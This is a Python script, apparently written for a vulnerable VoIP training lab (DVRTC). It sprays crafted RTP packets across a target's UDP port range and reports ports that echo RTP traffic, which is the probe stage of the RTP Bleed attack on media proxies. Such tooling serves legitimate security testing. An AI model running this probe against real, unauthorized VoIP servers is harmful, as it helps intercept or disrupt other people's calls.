#!/usr/bin/env python3
"""Lightweight RTP bleed-style probe for DVRTC testing labs."""

from __future__ import annotations

import argparse
import random
import select
import socket
import struct
import sys
import time
from typing import Set


def build_rtp_packet(
    seq: int,
    timestamp: int,
    ssrc: int,
    payload_type: int,
    payload_size: int,
) -> bytes:
    version = 2
    padding = 0
    extension = 0
    csrc_count = 0
    marker = 0
    first = (version << 6) | (padding << 5) | (extension << 4) | csrc_count
    second = (marker << 7) | (payload_type & 0x7F)
    header = struct.pack("!BBHII", first, second, seq & 0xFFFF, timestamp & 0xFFFFFFFF, ssrc)
    payload = b"\x7f" * max(1, payload_size)
    return header + payload


def is_rtp(data: bytes) -> bool:
    return len(data) >= 12 and (data[0] & 0xC0) == 0x80


def drain_socket(sock: socket.socket, timeout: float, found: Set[int], first: bool) -> bool:
    """Collect RTP replies for up to timeout seconds."""
    deadline = time.monotonic() + max(timeout, 0.0)
    while True:
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            return False
        readable, _, _ = select.select([sock], [], [], remaining)
        if not readable:
            return False
        data, src = sock.recvfrom(4096)
        if is_rtp(data):
            src_host, src_port = src[0], src[1]
            if src_port not in found:
                found.add(src_port)
                print(f"[+] RTP response from {src_host}:{src_port} ({len(data)} bytes)")
                if first:
                    return True


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Probe a UDP port range for RTP responses")
    p.add_argument("host", help="Target host")
    p.add_argument("start_port", type=int, help="Start UDP port")
    p.add_argument("end_port", type=int, help="End UDP port (inclusive)")
    p.add_argument(
        "--probes",
        type=int,
        default=1,
        help="Probe packets per port in each spray cycle (default: 1)",
    )
    p.add_argument("--timeout", type=float, default=0.08, help="Socket timeout in seconds (default: 0.08)")
    p.add_argument(
        "--listen",
        type=float,
        default=1.0,
        help="Post-probe listen window in seconds (default: 1.0)",
    )
    p.add_argument(
        "--duration",
        type=float,
        default=6.0,
        help="Continuously spray the entire range for N seconds before the final listen (default: 6.0)",
    )
    p.add_argument(
        "--cycle-listen",
        type=float,
        default=0.05,
        help="Extra listen time after each full spray cycle when --duration is used (default: 0.05)",
    )
    p.add_argument("--payload-type", type=int, default=0, help="RTP payload type (default: 0)")
    p.add_argument(
        "--payload-size",
        type=int,
        default=160,
        help="Probe payload size in bytes (default: 160)",
    )
    p.add_argument(
        "--source-port",
        type=int,
        default=0,
        help="Bind the probe socket to a fixed local UDP port (default: random)",
    )
    p.add_argument("--first", action="store_true", help="Stop after first positive port")
    return p.parse_args()


def main() -> int:
    args = parse_args()
    if args.start_port > args.end_port:
        print("start_port must be <= end_port", file=sys.stderr)
        return 2

    found: Set[int] = set()
    seq = random.randint(1, 65535)
    timestamp = random.randint(1, 0xFFFFFFFF)
    ssrc = random.randint(1, 0xFFFFFFFF)

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.bind(("0.0.0.0", args.source_port))
        sock.settimeout(args.timeout)

        if args.duration > 0:
            deadline = time.monotonic() + args.duration
            while time.monotonic() < deadline:
                for port in range(args.start_port, args.end_port + 1):
                    for _ in range(max(args.probes, 1)):
                        pkt = build_rtp_packet(
                            seq,
                            timestamp,
                            ssrc,
                            args.payload_type,
                            args.payload_size,
                        )
                        sock.sendto(pkt, (args.host, port))
                        seq += 1
                        timestamp += 160
                    if drain_socket(sock, 0.0, found, args.first):
                        return 0
                if drain_socket(sock, min(args.cycle_listen, max(deadline - time.monotonic(), 0.0)), found, args.first):
                    return 0
            if drain_socket(sock, max(args.listen, args.timeout), found, args.first):
                return 0
        else:
            for port in range(args.start_port, args.end_port + 1):
                for _ in range(max(args.probes, 1)):
                    pkt = build_rtp_packet(
                        seq,
                        timestamp,
                        ssrc,
                        args.payload_type,
                        args.payload_size,
                    )
                    sock.sendto(pkt, (args.host, port))
                    seq += 1
                    timestamp += 160

                if drain_socket(sock, args.listen, found, args.first):
                    return 0

    if not found:
        print("[-] No RTP responses detected in requested range")
        return 1

    ports = ", ".join(str(p) for p in sorted(found))
    print(f"[*] Potential RTP ports: {ports}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
